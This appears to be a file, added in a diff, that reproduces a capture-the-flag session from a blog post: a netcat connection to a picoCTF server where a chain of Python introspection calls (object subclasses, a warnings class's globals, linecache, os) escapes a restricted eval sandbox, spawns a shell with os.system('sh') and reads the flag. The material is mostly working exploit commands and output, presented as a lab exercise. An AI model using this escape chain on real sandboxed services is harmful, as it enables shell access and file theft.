@@ -1,0 +1,27 @@
+# source: https://zolmeister.com/2013/05/escaping-python-sandbox.html
+
+root@kali32:~$ nc python.picoctf.com 6365
+Get a shell, if you can...
+
+__builtins__['ww']=().__class__.__base__
+Return Value: <type 'object'>
+
+__builtins__['w']=ww.__subclasses__()
+Return Value: [<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <type 'pwd.struct_passwd'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
+
+__builtins__['y']=w[53].__enter__.__func__
+Return Value: <function __enter__ at 0x7fc5508b91b8>
+
+__builtins__['a']=y.__globals__['linecache']
+Return Value: <module 'linecache' from '/usr/lib/python2.7/linecache.pyc'>
+
+__builtins__['os']=a.checkcache.__globals__['os']
+Return Value: <module 'os' from '/usr/lib/python2.7/os.pyc'>
+
+os.system('sh')
+ls
+flag_for_masters
+run.sh
+task5.py
+cat flag_for_masters
+you_are_the_pyeval_master
